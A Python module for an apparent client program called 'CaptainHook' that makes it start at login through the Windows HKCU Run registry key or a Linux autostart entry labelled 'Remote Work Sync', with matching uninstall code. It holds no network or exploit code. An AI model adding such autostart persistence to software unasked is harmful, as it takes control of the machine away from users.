import os
import sys
from src.client.core.platform import Platform

class Persistence:
    @staticmethod
    def install():
        if Platform.is_windows():
             Persistence.windows_registry()
        elif Platform.is_linux():
             Persistence.linux_desktop()
        elif Platform.is_macos():
             pass # To be added later

    @staticmethod
    def windows_registry():
        try:
            import winreg
            app_path = sys.executable
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "CaptainHook", 0, winreg.REG_SZ, app_path)
            return True
        except ImportError:
            return False

    @staticmethod
    def linux_desktop():
        try:
             desktop_content = f"""[Desktop Entry]
Type=Application
Exec={sys.executable}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=CaptainHook
Comment=Remote Work Sync
"""
             autostart_dir = os.path.expanduser("~/.config/autostart")
             if not os.path.exists(autostart_dir):
                 os.makedirs(autostart_dir)
             
             with open(os.path.join(autostart_dir, "captain_hook.desktop"), "w") as f:
                 f.write(desktop_content)
             return True
        except Exception:
             return False

    @staticmethod
    def uninstall():
        if Platform.is_windows():
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                    winreg.DeleteValue(reg_key, "CaptainHook")
                return True
            except:
                return False
        elif Platform.is_linux():
            try:
                desktop_file = os.path.expanduser("~/.config/autostart/captain_hook.desktop")
                if os.path.exists(desktop_file):
                    os.remove(desktop_file)
                return True
            except:
                return False
        return False
